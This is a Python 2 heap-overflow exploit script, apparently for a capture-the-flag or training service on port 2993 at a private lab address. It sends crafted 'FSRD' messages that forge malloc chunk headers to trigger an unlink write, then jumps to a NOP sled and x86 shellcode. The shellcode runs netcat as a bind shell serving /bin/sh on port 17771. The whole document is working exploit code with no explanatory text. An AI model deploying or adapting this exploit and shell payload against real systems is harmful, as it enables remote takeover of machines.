import socket
import struct

pre_size=0xfffffffc
fd=0x0804d41c-0xc
bk=0x804e0a0
nops="\x90"*45
shellcode="\x31\xc0\x31\xd2\x50\x68\x37\x37\x37\x31\x68\x2d\x76\x70\x31\x89\xe6\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x68\x2d\x6c\x65\x2f\x89\xe7\x50\x68\x2f\x2f\x6e\x63\x68\x2f\x62\x69\x6e\x89\xe3\x52\x56\x57\x53\x89\xe1\xb0\x0b\xcd\x80"

HOST='10.0.1.132'
PORT=2993
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((HOST,PORT))

print "[*]create first chunck"
data1="FSRD"+"B"*123+"\x2f"
print "[*]len of data1: {0}".format(len(data1))
s.send(data1)

print "[*]create second chunck and fake header" 
data2="FSRD"+"ROOT"+nops+shellcode+"\x2f"+struct.pack("I",pre_size)*2+struct.pack("I",fd)+struct.pack("I",bk)
print "[*]len of data2: {0}".format(len(data2))
s.send(data2)

print "[*]create third chunck and free"
data3="AAAA"
print "[*]len of data3: {0}".format(len(data3))
s.send(data3)
s.recv(1024)
s.close()
